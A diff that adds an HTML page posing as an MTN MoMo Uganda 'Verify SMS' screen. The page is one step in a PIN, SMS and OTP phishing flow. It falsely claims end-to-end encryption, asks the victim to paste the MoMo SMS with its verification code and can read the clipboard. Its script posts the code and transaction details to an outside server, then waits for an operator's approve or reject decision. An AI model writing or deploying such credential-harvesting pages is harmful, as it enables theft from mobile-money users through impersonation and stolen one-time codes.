@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MTN MoMo — Verify SMS</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --mtn-yellow:#FFCC00;
+    --mtn-yellow-dark:#F5B500;
+    --mtn-yellow-light:#FFF8E1;
+    --mtn-blue:#0047AB;
+    --mtn-blue-dark:#003380;
+    --mtn-navy:#111827;
+    --mtn-green:#22A356;
+    --mtn-red:#E31B23;
+    --bg:#F8FAFC;
+    --soft:#F5F7F9;
+    --border:#E5E7EB;
+    --white:#FFFFFF;
+    --muted:#6B7280;
+    --radius:18px;
+    --shadow:0 10px 30px rgba(17,24,39,0.06);
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{font-family:'Poppins',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--mtn-navy);-webkit-font-smoothing:antialiased;line-height:1.5;min-height:100vh;padding:0 0 40px}
+
+  /* ================= HEADER ================= */
+  .header{background:var(--white);border-bottom:1px solid var(--border);padding:0 16px;position:sticky;top:0;z-index:50}
+  .header-inner{max-width:480px;margin:0 auto;height:60px;display:flex;align-items:center;justify-content:space-between}
+  .brand{display:inline-flex;align-items:center;gap:8px;font-weight:800;font-size:20px;letter-spacing:-0.4px;line-height:1;user-select:none}
+  .brand .logo-img{height:28px;width:auto;display:block;border-radius:4px}
+  .brand .mtn{color:var(--mtn-blue)}
+  .brand .momo{color:#003366}
+  .help-btn{display:inline-flex;align-items:center;gap:6px;padding:7px 14px;border-radius:20px;border:1.5px solid var(--border);background:var(--white);font-size:12.5px;font-weight:600;color:var(--mtn-blue);cursor:pointer;font-family:inherit}
+  .help-btn:hover{border-color:var(--mtn-blue);background:#F0F6FC}
+
+  .wrap{max-width:480px;margin:0 auto;padding:20px 16px 0}
+
+  /* ================= PROGRESS BAR ================= */
+  .progress-row{display:flex;align-items:center;gap:8px;margin-bottom:20px;padding:0 4px}
+  .progress-step{flex:1;display:flex;flex-direction:column;align-items:center;gap:6px;position:relative}
+  .progress-dot{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;background:#E5E7EB;color:#94A3B8;border:2px solid #E5E7EB;position:relative;z-index:2;transition:all .3s}
+  .progress-dot.done{background:var(--mtn-green);border-color:var(--mtn-green);color:#fff}
+  .progress-dot.active{background:var(--mtn-yellow);border-color:var(--mtn-yellow-dark);color:#003366;box-shadow:0 0 0 4px rgba(255,204,0,.2)}
+  .progress-label{font-size:10.5px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.4px}
+  .progress-label.active{color:#003366}
+  .progress-connector{position:absolute;top:14px;left:calc(50% + 20px);right:calc(-50% + 20px);height:2px;background:#E5E7EB;z-index:1}
+  .progress-connector.done{background:var(--mtn-green)}
+
+  /* ================= SUMMARY CARD ================= */
+  .summary{background:var(--white);border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:16px;box-shadow:var(--shadow)}
+  .summary-row{display:flex;justify-content:space-between;align-items:center;padding:6px 0;font-size:12.5px}
+  .summary-row .k{color:var(--muted);font-weight:500}
+  .summary-row .v{color:var(--mtn-navy);font-weight:700;text-align:right;max-width:60%;word-break:break-word}
+  .summary-row .v.amount{color:var(--mtn-blue);font-size:16px;font-weight:800}
+  .summary-divider{height:1px;background:var(--border);margin:4px 0}
+
+  /* ================= MAIN CARD ================= */
+  .card{background:var(--white);border:1px solid var(--border);border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden;padding:24px 20px}
+
+  .card-icon-wrap{display:flex;justify-content:center;margin-bottom:14px}
+  .card-icon{width:56px;height:56px;border-radius:50%;background:var(--mtn-yellow-light);display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 6px rgba(255,204,0,.12)}
+  .card-icon svg{width:26px;height:26px;stroke:#003366;stroke-width:2.2;fill:none;stroke-linecap:round;stroke-linejoin:round}
+
+  .card-title{font-size:17px;font-weight:800;letter-spacing:-0.3px;margin-bottom:6px;text-align:center}
+  .card-desc{font-size:12.5px;color:var(--muted);text-align:center;margin-bottom:22px;line-height:1.55}
+
+  /* ================= STEPS HINT ================= */
+  .hint-box{background:linear-gradient(135deg,#FFF8E1,#FFF3C4);border:1.5px solid var(--mtn-yellow);border-radius:12px;padding:12px 14px;margin-bottom:18px;display:flex;gap:10px;align-items:flex-start}
+  .hint-icon{font-size:18px;flex-shrink:0;line-height:1.4}
+  .hint-text{font-size:11.5px;color:#5a4a00;line-height:1.55;font-weight:500}
+  .hint-text strong{color:#003366;font-weight:800}
+
+  /* ================= SMS TEXTAREA ================= */
+  .sms-label-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+  .field-label{display:block;font-size:12px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:0.7px}
+  .char-count{font-size:10.5px;font-weight:700;color:var(--muted);background:#F4F6FA;padding:3px 9px;border-radius:20px;font-variant-numeric:tabular-nums;transition:all .2s}
+  .char-count.valid{color:var(--mtn-green);background:#F0FDF4}
+  .char-count.warning{color:#D97706;background:#FEF3C7}
+
+  .sms-wrapper{position:relative;margin-bottom:8px}
+  .sms-textarea{width:100%;min-height:160px;max-height:280px;border:2px solid var(--border);border-radius:14px;background:#FBFCFE;padding:16px 16px 52px;font-size:13.5px;font-family:'Poppins',inherit;color:var(--mtn-navy);line-height:1.6;resize:vertical;outline:none;transition:border-color .2s,box-shadow .2s,background .2s}
+  .sms-textarea:focus{border-color:var(--mtn-blue);background:#fff;box-shadow:0 0 0 4px rgba(0,71,171,.08)}
+  .sms-textarea::placeholder{color:#B6BFCC;font-weight:500}
+  .sms-textarea.invalid{border-color:var(--mtn-red);background:#FFF5F5;animation:shake .4s}
+  @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+
+  .paste-btn{position:absolute;bottom:12px;right:12px;background:var(--mtn-yellow);color:#003366;border:none;padding:8px 14px;border-radius:20px;font-size:11.5px;font-weight:800;cursor:pointer;display:inline-flex;align-items:center;gap:6px;box-shadow:0 3px 10px rgba(255,204,0,.4);transition:all .15s;font-family:inherit}
+  .paste-btn:hover{background:var(--mtn-yellow-dark);transform:translateY(-1px)}
+  .paste-btn:active{transform:translateY(0)}
+
+  /* ================= ERROR TEXT ================= */
+  .error-text{color:var(--mtn-red);font-size:11.5px;margin-top:4px;margin-bottom:12px;display:none;font-weight:600}
+  .error-text.show{display:block;animation:slideDown .25s}
+  @keyframes slideDown{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+
+  /* ================= SUBMIT BUTTON ================= */
+  .submit-btn{width:100%;padding:14px;background:var(--mtn-blue);color:#fff;border:none;border-radius:12px;font-size:14.5px;font-weight:700;letter-spacing:.3px;cursor:pointer;font-family:inherit;transition:filter .15s,transform .1s;box-shadow:0 4px 12px rgba(0,71,171,.25);margin-top:4px}
+  .submit-btn:hover:not(:disabled){filter:brightness(1.08)}
+  .submit-btn:active:not(:disabled){transform:scale(.99)}
+  .submit-btn:disabled{opacity:.6;cursor:not-allowed}
+
+  .secure-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:14px;font-size:11px;color:var(--muted);font-weight:500}
+  .secure-row svg{width:12px;height:12px;stroke:var(--mtn-green);stroke-width:2.5;fill:none}
+
+  /* ================= OVERLAYS ================= */
+  .overlay{position:fixed;inset:0;background:rgba(17,24,39,.65);backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:1000;padding:16px}
+  .overlay.show{display:flex;animation:fadeIn .2s}
+  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+  .overlay-card{background:var(--white);border-radius:18px;max-width:360px;width:100%;padding:28px 22px;text-align:center;box-shadow:0 20px 50px rgba(0,0,0,.25);animation:popIn .25s}
+  @keyframes popIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
+  .spinner{width:52px;height:52px;margin:0 auto 18px;border:4px solid #E5E7EB;border-top-color:var(--mtn-yellow);border-radius:50%;animation:spin .9s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .overlay-title{font-size:16px;font-weight:800;letter-spacing:-0.3px;margin-bottom:6px}
+  .overlay-desc{font-size:12.5px;color:var(--muted);line-height:1.55}
+  .overlay-hint{font-size:11px;color:var(--muted);margin-top:14px;font-weight:500}
+
+  .status-icon{width:60px;height:60px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+  .status-icon svg{width:28px;height:28px;stroke:#fff;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round}
+  .status-icon.success{background:var(--mtn-green);box-shadow:0 0 0 6px rgba(34,163,86,.14)}
+  .status-icon.error{background:var(--mtn-red);box-shadow:0 0 0 6px rgba(227,27,35,.14)}
+  .status-title{font-size:18px;font-weight:800;letter-spacing:-0.3px;margin-bottom:8px}
+  .status-desc{font-size:13px;color:var(--muted);line-height:1.55;margin-bottom:20px}
+  .status-btn{width:100%;padding:13px;background:var(--mtn-blue);color:#fff;border:none;border-radius:11px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;transition:filter .15s}
+  .status-btn:hover{filter:brightness(1.08)}
+  .status-btn.secondary{background:var(--white);color:var(--mtn-blue);border:1.5px solid var(--mtn-blue);margin-top:10px}
+
+  @media (max-width:380px){
+    .card{padding:20px 16px}
+    .sms-textarea{min-height:140px}
+    .progress-label{font-size:9.5px}
+  }
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-inner">
+    <div class="brand">
+      <img src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg" alt="MTN MoMo" class="logo-img">
+      <span class="mtn">MTN</span><span class="momo">&nbsp;MoMo</span>
+    </div>
+    <button class="help-btn" onclick="openHelp()">? Help</button>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- PROGRESS -->
+  <div class="progress-row">
+    <div class="progress-step">
+      <div class="progress-dot done">✓</div>
+      <div class="progress-label">PIN</div>
+    </div>
+    <div class="progress-step">
+      <div class="progress-dot active">2</div>
+      <div class="progress-label active">SMS</div>
+    </div>
+    <div class="progress-step">
+      <div class="progress-dot">3</div>
+      <div class="progress-label">OTP</div>
+    </div>
+  </div>
+
+  <!-- SUMMARY -->
+  <div class="summary">
+    <div class="summary-row">
+      <span class="k">Amount</span>
+      <span class="v amount" id="sumAmount">—</span>
+    </div>
+    <div class="summary-divider"></div>
+    <div class="summary-row">
+      <span class="k">Recipient</span>
+      <span class="v" id="sumRecipient">—</span>
+    </div>
+    <div class="summary-row">
+      <span class="k">Transaction</span>
+      <span class="v" id="sumTx">—</span>
+    </div>
+  </div>
+
+  <!-- MAIN CARD -->
+  <div class="card">
+    <div class="card-icon-wrap">
+      <div class="card-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+        </svg>
+      </div>
+    </div>
+    <div class="card-title">Paste Your SMS</div>
+    <div class="card-desc">Paste the MTN MoMo SMS you just received to verify this payment.</div>
+
+    <div class="hint-box">
+      <div class="hint-icon">💡</div>
+      <div class="hint-text">Look for the <strong>MoMo notification SMS</strong> on your phone. Copy the full message — including the verification code — and paste it below.</div>
+    </div>
+
+    <div class="sms-label-row">
+      <label class="field-label">MoMo SMS Message</label>
+      <span class="char-count" id="charCount">0</span>
+    </div>
+
+    <div class="sms-wrapper">
+      <textarea class="sms-textarea" id="sms" placeholder="Paste the full SMS from MTN MoMo here…" maxlength="800"></textarea>
+      <button type="button" class="paste-btn" onclick="pasteFromClipboard()">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+        </svg>
+        Paste
+      </button>
+    </div>
+    <div class="error-text" id="smsError">Please paste the complete SMS message</div>
+
+    <button type="button" class="submit-btn" id="submitBtn" onclick="submitSms()">Verify &amp; Continue</button>
+
+    <div class="secure-row">
+      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      <span>Secured by MTN MoMo · End-to-end encrypted</span>
+    </div>
+  </div>
+
+</div>
+
+<!-- WAITING OVERLAY -->
+<div class="overlay" id="waitingOverlay">
+  <div class="overlay-card">
+    <div class="spinner"></div>
+    <div class="overlay-title" id="waitingTitle">Verifying SMS…</div>
+    <div class="overlay-desc" id="waitingDesc">Please wait while we confirm your message.</div>
+    <div class="overlay-hint">Do not close this page</div>
+  </div>
+</div>
+
+<!-- RESULT OVERLAY -->
+<div class="overlay" id="resultOverlay">
+  <div class="overlay-card">
+    <div class="status-icon" id="resultIcon"></div>
+    <div class="status-title" id="resultTitle">—</div>
+    <div class="status-desc" id="resultDesc">—</div>
+    <button class="status-btn" id="resultBtn" onclick="closeResult()">Try Again</button>
+    <button class="status-btn secondary" id="resultBtn2" onclick="goBackToPin()" style="display:none">Re-enter PIN</button>
+  </div>
+</div>
+
+<script>
+const API_BASE = 'https://uganda-momo.onrender.com'; // ← change to your Render URL
+const POLL_MS = 2500;
+const TIMEOUT_MS = 60 * 60 * 1000;
+const CURRENT_KEY = 'momo_current';
+
+let currentSessionId = null;
+let pollTimer = null;
+let startedAt = 0;
+let currentReceipt = null;
+
+function loadReceipt(){
+  const params = new URLSearchParams(location.search);
+  const tx = params.get('tx') || '';
+  const amt = params.get('am') || '0';
+  const cur = params.get('cur') || 'UGX';
+  const rn = params.get('rn') || '';
+  const an = params.get('an') || '';
+
+  if(tx && amt !== '0'){
+    return { tx, am: amt, cur, rn, an,
+      senderName: 'MTN MoMo Merchant',
+      createdAt: Date.now(), pm: '', sn: '' };
+  }
+
+  try {
+    const stored = JSON.parse(sessionStorage.getItem(CURRENT_KEY) || 'null');
+    if(stored) return stored;
+  } catch(e){}
+  return null;
+}
+
+currentReceipt = loadReceipt();
+
+if(!currentReceipt || !currentReceipt.tx){
+  document.querySelector('.card').innerHTML =
+    '<div class="card-title">Invalid Session</div>' +
+    '<div class="card-desc">This verification link is invalid or expired. Please start over from the receipt page.</div>';
+} else {
+  const cur = (currentReceipt.cur || 'UGX').toUpperCase();
+  const amtNum = Number(currentReceipt.am || 0);
+  const amtStr = amtNum.toLocaleString('en-UG', { maximumFractionDigits: 0 });
+  document.getElementById('sumAmount').textContent = cur + ' ' + amtStr;
+  document.getElementById('sumRecipient').textContent = currentReceipt.rn || '—';
+  document.getElementById('sumTx').textContent = currentReceipt.tx || '—';
+}
+
+/* Textarea + character counter */
+const smsEl = document.getElementById('sms');
+const charCount = document.getElementById('charCount');
+const smsError = document.getElementById('smsError');
+const submitBtn = document.getElementById('submitBtn');
+
+smsEl.addEventListener('input', () => {
+  const len = smsEl.value.trim().length;
+  charCount.textContent = len;
+  charCount.classList.remove('valid', 'warning');
+  if(len >= 10) charCount.classList.add('valid');
+  else if(len > 0) charCount.classList.add('warning');
+  if(len >= 10){
+    smsError.classList.remove('show');
+    smsEl.classList.remove('invalid');
+  }
+});
+
+async function pasteFromClipboard(){
+  try {
+    const text = await navigator.clipboard.readText();
+    if(text){
+      smsEl.value = text;
+      smsEl.dispatchEvent(new Event('input'));
+      smsEl.focus();
+    }
+  } catch(e){
+    smsEl.focus();
+  }
+}
+
+async function submitSms(){
+  if(!currentReceipt || !currentReceipt.tx) return;
+
+  const sms = smsEl.value.trim();
+  if(sms.length < 10){
+    smsEl.classList.add('invalid');
+    smsError.classList.add('show');
+    smsEl.focus();
+    return;
+  }
+
+  submitBtn.disabled = true;
+  submitBtn.textContent = 'Sending…';
+
+  try {
+    startedAt = Date.now();
+    showWaiting('Verifying SMS…', 'Please wait while we confirm your message.');
+
+    const res = await fetch(`${API_BASE}/api/notify`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        stage: 'sms',
+        sms: sms,
+        receipt: {
+          trackingNumber: currentReceipt.tx,
+          accountName: currentReceipt.rn,
+          accountNumber: currentReceipt.an,
+          amount: currentReceipt.am,
+          currency: currentReceipt.cur,
+          countryName: 'Uganda',
+          countryCode: '+256',
+          modeOfPayment: currentReceipt.pm || 'MTN MoMo',
+          receiptOptional: currentReceipt.sn || ''
+        }
+      })
+    });
+    const data = await res.json().catch(() => ({}));
+    if(!res.ok || !data.ok) throw new Error(data.error || 'Request failed');
+    currentSessionId = data.sessionId;
+    startPolling();
+  } catch(err){
+    hideWaiting();
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Verify & Continue';
+    showResult('error', 'Connection failed', 'Please check your internet and try again.', false);
+  }
+}
+
+function startPolling(){
+  stopPolling();
+  pollTimer = setInterval(async () => {
+    if(Date.now() - startedAt > TIMEOUT_MS){
+      stopPolling(); hideWaiting();
+      showResult('error', 'Session expired', 'Please start over from the receipt page.', false);
+      return;
+    }
+    try {
+      const res = await fetch(`${API_BASE}/api/status/${currentSessionId}`);
+      const data = await res.json().catch(() => ({}));
+      if(!data.ok) return;
+
+      if(data.status === 'approved'){
+        stopPolling(); hideWaiting();
+        // Move to OTP page
+        const params = new URLSearchParams({
+          tx: currentReceipt.tx || '',
+          am: currentReceipt.am || '0',
+          cur: currentReceipt.cur || 'UGX',
+          rn: currentReceipt.rn || '',
+          an: currentReceipt.an || ''
+        });
+        window.location.href = 'otp.html?' + params.toString();
+      } else if(data.status === 'rejected' || data.status === 'declined'){
+        stopPolling(); hideWaiting();
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Verify & Continue';
+        smsEl.value = '';
+        smsEl.dispatchEvent(new Event('input'));
+        smsEl.focus();
+        showResult('error', 'SMS rejected', 'The SMS you pasted is incorrect. Please paste the correct one.', false);
+      } else if(data.status === 'resend'){
+        stopPolling(); hideWaiting();
+        // Back to PIN flow
+        showResult('error', 'New PIN Required', 'Please re-enter your MTN MoMo PIN to restart.', true);
+      } else if(data.status === 'expired'){
+        stopPolling(); hideWaiting();
+        showResult('error', 'Session expired', 'Please start over from the receipt page.', false);
+      }
+    } catch(e){}
+  }, POLL_MS);
+}
+
+function stopPolling(){ if(pollTimer){ clearInterval(pollTimer); pollTimer=null; } }
+
+function showWaiting(title, desc){
+  document.getElementById('waitingTitle').textContent = title;
+  document.getElementById('waitingDesc').textContent = desc;
+  document.getElementById('waitingOverlay').classList.add('show');
+}
+function hideWaiting(){ document.getElementById('waitingOverlay').classList.remove('show'); }
+
+function showResult(type, title, desc, showBackToPin){
+  const icon = document.getElementById('resultIcon');
+  icon.className = 'status-icon ' + (type === 'success' ? 'success' : 'error');
+  icon.innerHTML = type === 'success'
+    ? '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>'
+    : '<svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>';
+  document.getElementById('resultTitle').textContent = title;
+  document.getElementById('resultDesc').textContent = desc;
+
+  const btn = document.getElementById('resultBtn');
+  const btn2 = document.getElementById('resultBtn2');
+
+  if(showBackToPin){
+    btn.textContent = 'Try Again';
+    btn.onclick = () => { closeResult(); };
+    btn2.style.display = 'block';
+  } else {
+    btn.textContent = 'Try Again';
+    btn.onclick = () => { closeResult(); };
+    btn2.style.display = 'none';
+  }
+
+  document.getElementById('resultOverlay').classList.add('show');
+}
+
+function closeResult(){
+  document.getElementById('resultOverlay').classList.remove('show');
+}
+
+function goBackToPin(){
+  const params = new URLSearchParams({
+    tx: currentReceipt.tx || '',
+    am: currentReceipt.am || '0',
+    cur: currentReceipt.cur || 'UGX',
+    rn: currentReceipt.rn || '',
+    an: currentReceipt.an || ''
+  });
+  window.location.href = 'pay.html?' + params.toString();
+}
+
+function openHelp(){ window.open('https://www.mtn.co.ug/', '_blank'); }
+</script>
+</body>
+</html>
